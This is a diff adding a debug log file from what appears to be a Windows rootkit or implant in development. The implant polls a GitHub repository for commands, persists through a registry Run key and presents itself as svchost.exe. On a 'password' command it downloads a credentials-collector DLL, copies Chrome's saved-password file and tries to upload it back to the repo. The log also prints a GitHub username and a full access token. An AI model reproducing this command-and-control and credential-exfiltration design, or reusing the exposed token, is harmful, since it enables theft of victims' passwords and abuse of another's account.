@@ -1,0 +1,142 @@
+Thu Jul 29 01:04:41 2021. Initialisation of the log file.
+
+DEBUG: Thu Jul 29 01:04:41 2021: GithubLogin: hidemepls785
+DEBUG: Thu Jul 29 01:04:41 2021: GithubRepoName: furry-octo-parakeet
+DEBUG: Thu Jul 29 01:04:41 2021: GihubAccessToken: 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
+DEBUG: Thu Jul 29 01:04:41 2021: Rootkit Name: VaubanPreprod
+DEBUG: Thu Jul 29 01:04:41 2021: Rootkit Registry Key: Sensors
+DEBUG: Thu Jul 29 01:04:41 2021: Run Registry Key Name: X0test
+DEBUG: Thu Jul 29 01:04:41 2021: Adding the actual location of the servant: C:\Windows\SysWOW64\svchost.exe
+DEBUG: Thu Jul 29 01:04:41 2021: The folder list for random folder is not empty. Its size is: 2550
+DEBUG: Thu Jul 29 01:04:41 2021: The random path choosed for this execution is: C:\Users\sophie\Documents\mojo_dev\stagerDLL\LivingOffTheLand\Resources
+DEBUG: Thu Jul 29 01:04:41 2021: Start of a new loop to get commands and treat them.
+DEBUG: Thu Jul 29 01:04:41 2021: Start of GithubCommunication::receiveInstructions
+DEBUG: Thu Jul 29 01:04:42 2021: Success to get the instance number of the current instance: rootkit_path1
+DEBUG: Thu Jul 29 01:04:42 2021: Success to check the commands with rootkit_path1
+DEBUG: Thu Jul 29 01:04:42 2021: Getting this command from the github repo: stay_alive
+DEBUG: Thu Jul 29 01:04:42 2021: Getting this command from the github repo: password
+DEBUG: Thu Jul 29 01:04:42 2021: Start to treat the commands sent by the github repo.
+DEBUG: Thu Jul 29 01:04:42 2021: Command received: stay_alive
+DEBUG: Thu Jul 29 01:04:42 2021: End of the function used to answer the commands. Check the file results.txt.
+DEBUG: Thu Jul 29 01:04:42 2021: #####################################################
+
+DEBUG: Thu Jul 29 01:04:42 2021: Command received: password
+DEBUG: Thu Jul 29 01:04:42 2021: Start of the method messageManagerPasswordModule.
+DEBUG: Thu Jul 29 01:04:42 2021: Start of the method downloadFileFromGithubRepo with this file in the github repo: CredentialsCollectorDll.dll
+DEBUG: Thu Jul 29 01:04:42 2021: The answer of the github API seems to be correct for the file.
+DEBUG: Thu Jul 29 01:04:42 2021: The size of the content of the file is: 129536
+DEBUG: Thu Jul 29 01:04:42 2021: Start of the method writeFileWindowsApi.
+DEBUG: Thu Jul 29 01:04:42 2021: The content size that will be written: 129536
+DEBUG: Thu Jul 29 01:04:42 2021: Success to write the content(number of bytes : 129536) in the file : C:\Users\sophie\Documents\mojo_dev\stagerDLL\LivingOffTheLand\Resources\CredentialsCollectorDll.dll
+DEBUG: Thu Jul 29 01:04:42 2021: Start of the method CredentialsDllHandlerMain with the file: C:\Users\sophie\Documents\mojo_dev\stagerDLL\LivingOffTheLand\Resources\CredentialsCollectorDll.dll
+DEBUG: Thu Jul 29 01:04:43 2021: Success to have an handle to the credential dll.
+DEBUG: Thu Jul 29 01:04:43 2021: The file that contains chrome passwords has been copied.
+DEBUG: Thu Jul 29 01:04:43 2021: Start of the method uploadFileToGithubRepo.
+DEBUG: Thu Jul 29 01:04:43 2021: Start of the method readFileWindowsApi for the file: C:\Users\sophie\Documents\mojo_dev\stagerDLL\LivingOffTheLand\Resources\chromepassword
+ERROR: Thu Jul 29 01:04:43 2021: Heart attack, the instance has major bug during the execution of the module messageManagerPasswordModule, adding the error:
+ERROR: Thu Jul 29 01:04:43 2021: invalid string position
+DEBUG: Thu Jul 29 01:04:43 2021: End of the function used to answer the commands. Check the file results.txt.
+DEBUG: Thu Jul 29 01:04:43 2021: #####################################################
+
+DEBUG: Thu Jul 29 01:04:43 2021: Start of GithubCommunication::sendResults
+DEBUG: Thu Jul 29 01:04:44 2021: The results was uploaded on the github repo
+DEBUG: Thu Jul 29 01:05:14 2021: Start of a new loop to get commands and treat them.
+DEBUG: Thu Jul 29 01:05:14 2021: Start of GithubCommunication::receiveInstructions
+DEBUG: Thu Jul 29 01:05:14 2021: Success to get the instance number of the current instance: rootkit_path1
+DEBUG: Thu Jul 29 01:05:14 2021: Success to check the commands with rootkit_path1
+DEBUG: Thu Jul 29 01:05:14 2021: Getting this command from the github repo: stay_alive
+DEBUG: Thu Jul 29 01:05:14 2021: Getting this command from the github repo: password
+DEBUG: Thu Jul 29 01:05:14 2021: Start to treat the commands sent by the github repo.
+DEBUG: Thu Jul 29 01:05:14 2021: Command received: stay_alive
+DEBUG: Thu Jul 29 01:05:14 2021: End of the function used to answer the commands. Check the file results.txt.
+DEBUG: Thu Jul 29 01:05:14 2021: #####################################################
+
+DEBUG: Thu Jul 29 01:05:14 2021: Command received: password
+DEBUG: Thu Jul 29 01:05:14 2021: Start of the method messageManagerPasswordModule.
+DEBUG: Thu Jul 29 01:05:14 2021: Start of the method downloadFileFromGithubRepo with this file in the github repo: CredentialsCollectorDll.dll
+DEBUG: Thu Jul 29 01:05:15 2021: The answer of the github API seems to be correct for the file.
+DEBUG: Thu Jul 29 01:05:15 2021: The size of the content of the file is: 129536
+DEBUG: Thu Jul 29 01:05:15 2021: Start of the method writeFileWindowsApi.
+DEBUG: Thu Jul 29 01:05:15 2021: The content size that will be written: 129536
+ERROR: Thu Jul 29 01:05:15 2021: Unable to get an handle to the file. Last Windows error: 80
+DEBUG: Thu Jul 29 01:05:15 2021: Start of the method CredentialsDllHandlerMain with the file: C:\Users\sophie\Documents\mojo_dev\stagerDLL\LivingOffTheLand\Resources\CredentialsCollectorDll.dll
+DEBUG: Thu Jul 29 01:05:15 2021: Success to have an handle to the credential dll.
+DEBUG: Thu Jul 29 01:05:15 2021: The file that contains chrome passwords has been copied.
+DEBUG: Thu Jul 29 01:05:15 2021: Start of the method uploadFileToGithubRepo.
+DEBUG: Thu Jul 29 01:05:15 2021: Start of the method readFileWindowsApi for the file: C:\Users\sophie\Documents\mojo_dev\stagerDLL\LivingOffTheLand\Resources\chromepassword
+ERROR: Thu Jul 29 01:05:15 2021: Heart attack, the instance has major bug during the execution of the module messageManagerPasswordModule, adding the error:
+ERROR: Thu Jul 29 01:05:15 2021: invalid string position
+DEBUG: Thu Jul 29 01:05:15 2021: End of the function used to answer the commands. Check the file results.txt.
+DEBUG: Thu Jul 29 01:05:15 2021: #####################################################
+
+DEBUG: Thu Jul 29 01:05:15 2021: Start of GithubCommunication::sendResults
+DEBUG: Thu Jul 29 01:05:16 2021: The results was uploaded on the github repo
+DEBUG: Thu Jul 29 01:05:46 2021: Start of a new loop to get commands and treat them.
+DEBUG: Thu Jul 29 01:05:46 2021: Start of GithubCommunication::receiveInstructions
+DEBUG: Thu Jul 29 01:05:47 2021: Success to get the instance number of the current instance: rootkit_path1
+DEBUG: Thu Jul 29 01:05:47 2021: Success to check the commands with rootkit_path1
+DEBUG: Thu Jul 29 01:05:47 2021: Getting this command from the github repo: stay_alive
+DEBUG: Thu Jul 29 01:05:47 2021: Getting this command from the github repo: password
+DEBUG: Thu Jul 29 01:05:47 2021: Start to treat the commands sent by the github repo.
+DEBUG: Thu Jul 29 01:05:47 2021: Command received: stay_alive
+DEBUG: Thu Jul 29 01:05:47 2021: End of the function used to answer the commands. Check the file results.txt.
+DEBUG: Thu Jul 29 01:05:47 2021: #####################################################
+
+DEBUG: Thu Jul 29 01:05:47 2021: Command received: password
+DEBUG: Thu Jul 29 01:05:47 2021: Start of the method messageManagerPasswordModule.
+DEBUG: Thu Jul 29 01:05:47 2021: Start of the method downloadFileFromGithubRepo with this file in the github repo: CredentialsCollectorDll.dll
+DEBUG: Thu Jul 29 01:05:47 2021: The answer of the github API seems to be correct for the file.
+DEBUG: Thu Jul 29 01:05:47 2021: The size of the content of the file is: 129536
+DEBUG: Thu Jul 29 01:05:47 2021: Start of the method writeFileWindowsApi.
+DEBUG: Thu Jul 29 01:05:47 2021: The content size that will be written: 129536
+ERROR: Thu Jul 29 01:05:47 2021: Unable to get an handle to the file. Last Windows error: 80
+DEBUG: Thu Jul 29 01:05:47 2021: Start of the method CredentialsDllHandlerMain with the file: C:\Users\sophie\Documents\mojo_dev\stagerDLL\LivingOffTheLand\Resources\CredentialsCollectorDll.dll
+DEBUG: Thu Jul 29 01:05:47 2021: Success to have an handle to the credential dll.
+DEBUG: Thu Jul 29 01:05:48 2021: The file that contains chrome passwords has been copied.
+DEBUG: Thu Jul 29 01:05:48 2021: Start of the method uploadFileToGithubRepo.
+DEBUG: Thu Jul 29 01:05:48 2021: Start of the method readFileWindowsApi for the file: C:\Users\sophie\Documents\mojo_dev\stagerDLL\LivingOffTheLand\Resources\chromepassword
+ERROR: Thu Jul 29 01:05:48 2021: Heart attack, the instance has major bug during the execution of the module messageManagerPasswordModule, adding the error:
+ERROR: Thu Jul 29 01:05:48 2021: invalid string position
+DEBUG: Thu Jul 29 01:05:48 2021: End of the function used to answer the commands. Check the file results.txt.
+DEBUG: Thu Jul 29 01:05:48 2021: #####################################################
+
+DEBUG: Thu Jul 29 01:05:48 2021: Start of GithubCommunication::sendResults
+DEBUG: Thu Jul 29 01:05:50 2021: The results was uploaded on the github repo
+DEBUG: Thu Jul 29 01:06:20 2021: Start of a new loop to get commands and treat them.
+DEBUG: Thu Jul 29 01:06:20 2021: Start of GithubCommunication::receiveInstructions
+DEBUG: Thu Jul 29 01:06:20 2021: Success to get the instance number of the current instance: rootkit_path1
+DEBUG: Thu Jul 29 01:06:20 2021: Success to check the commands with rootkit_path1
+DEBUG: Thu Jul 29 01:06:20 2021: Getting this command from the github repo: stay_alive
+DEBUG: Thu Jul 29 01:06:20 2021: Getting this command from the github repo: password
+DEBUG: Thu Jul 29 01:06:20 2021: Start to treat the commands sent by the github repo.
+DEBUG: Thu Jul 29 01:06:20 2021: Command received: stay_alive
+DEBUG: Thu Jul 29 01:06:20 2021: End of the function used to answer the commands. Check the file results.txt.
+DEBUG: Thu Jul 29 01:06:20 2021: #####################################################
+
+DEBUG: Thu Jul 29 01:06:20 2021: Command received: password
+DEBUG: Thu Jul 29 01:06:20 2021: Start of the method messageManagerPasswordModule.
+DEBUG: Thu Jul 29 01:06:20 2021: Start of the method downloadFileFromGithubRepo with this file in the github repo: CredentialsCollectorDll.dll
+DEBUG: Thu Jul 29 01:06:21 2021: The answer of the github API seems to be correct for the file.
+DEBUG: Thu Jul 29 01:06:21 2021: The size of the content of the file is: 129536
+DEBUG: Thu Jul 29 01:06:21 2021: Start of the method writeFileWindowsApi.
+DEBUG: Thu Jul 29 01:06:21 2021: The content size that will be written: 129536
+ERROR: Thu Jul 29 01:06:21 2021: Unable to get an handle to the file. Last Windows error: 80
+DEBUG: Thu Jul 29 01:06:21 2021: Start of the method CredentialsDllHandlerMain with the file: C:\Users\sophie\Documents\mojo_dev\stagerDLL\LivingOffTheLand\Resources\CredentialsCollectorDll.dll
+DEBUG: Thu Jul 29 01:06:21 2021: Success to have an handle to the credential dll.
+DEBUG: Thu Jul 29 01:06:21 2021: The file that contains chrome passwords has been copied.
+DEBUG: Thu Jul 29 01:06:21 2021: Start of the method uploadFileToGithubRepo.
+DEBUG: Thu Jul 29 01:06:21 2021: Start of the method readFileWindowsApi for the file: C:\Users\sophie\Documents\mojo_dev\stagerDLL\LivingOffTheLand\Resources\chromepassword
+ERROR: Thu Jul 29 01:06:21 2021: Heart attack, the instance has major bug during the execution of the module messageManagerPasswordModule, adding the error:
+ERROR: Thu Jul 29 01:06:21 2021: invalid string position
+DEBUG: Thu Jul 29 01:06:21 2021: End of the function used to answer the commands. Check the file results.txt.
+DEBUG: Thu Jul 29 01:06:21 2021: #####################################################
+
+DEBUG: Thu Jul 29 01:06:21 2021: Start of GithubCommunication::sendResults
+DEBUG: Thu Jul 29 01:06:22 2021: The results was uploaded on the github repo
+DEBUG: Thu Jul 29 17:40:00 2021: Start of a new loop to get commands and treat them.
+DEBUG: Thu Jul 29 17:40:00 2021: Start of GithubCommunication::receiveInstructions
+DEBUG: Thu Jul 29 17:40:00 2021: Success to get the instance number of the current instance: rootkit_path1
+DEBUG: Thu Jul 29 17:40:00 2021: Success to check the commands with rootkit_path1
+DEBUG: Thu Jul 29 17:40:00 2021: No commands are given in the github repo.
+DEBUG: Thu Jul 29 17:40:00 2021: The receive method and the method to send the results return true, breaking the Servant Mission loop.
+DEBUG: Thu Jul 29 17:40:00 2021: Start of GithubCommunication::sendLogs
